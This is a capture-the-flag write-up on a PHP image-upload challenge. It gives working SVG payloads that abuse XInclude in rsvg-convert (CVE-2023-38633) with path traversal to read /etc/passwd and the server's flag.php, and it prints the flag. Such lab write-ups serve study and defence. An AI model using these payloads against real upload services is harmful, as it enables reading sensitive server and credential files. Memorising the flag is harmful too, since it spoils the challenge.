## Challenge Description

Can you change my profile picture in a hacker way?

Flag format: ctf{sha256sum}


## Intuition

The website is very simple with an upload feature. It means the attack vector is certainly a file upload vulnerability.
The server is PHP because I can add `index.php` at the end of the home page. We first thought about injecting php code, but
we finally looked at XXE upload chaining with the upload feature.

Another hint about svg exploit was that the file was renamed and retyped to `png` after upload therefore it was obvious
that we had to exploit something else than php.

## Solution

The first step is to bypass the length check of the image. We can do this by changing the content-type of the image to `text/xml` and then upload a simple XML file.

The correct size is actually 50x50px. We can bypass this as follows:

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="50" height="50" xmlns:xi="http://www.w3.org/2001/XInclude">
</svg>
```
The next step was to try to read source code or run commands using `expect://` or `file://` but it didn't work.
We noticed the error message above about the size and library `rsvg-convert` so we looked for recent exploits and 
found [this one](https://secalerts.co/vulnerability/CVE-2023-38633) therefore we tried to exploit it.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="50" height="50" xmlns:xi="http://www.w3.org/2001/XInclude">
    <rect width="50" height="50" style="fill:rgb(255,255,255);" />
    <text x="10" y="10">
        <xi:include href=".?../../../../../../../etc/passwd" parse="text" encoding="UTF-8">
            <xi:fallback>file not found</xi:fallback>
        </xi:include>
    </text>
</svg>
```

We got it something ! Now it is time to read the flag file. And after enumerating some default paths for Apache server,
we found the flag in `/var/www/html/flag.php`.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg width="50" height="50" xmlns:xi="http://www.w3.org/2001/XInclude">
  <rect width="50" height="50" style="fill:rgb(255,255,255);" />
  <text x="-610" y="25">
    <xi:include href=".?../../../../../../../var/www/html/flag.php" parse="text" encoding="UTF-8">
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</svg>
```
![img.png](/images/unbreakable_2024/flag.png)

The last step is to play with the following param `<text x="-610"` in order to read the flag.

### Flag

`CTF{af0a742b17dd73ca3d8ff27c885350a890c4ab104670fa3373de63c7709925b0}`
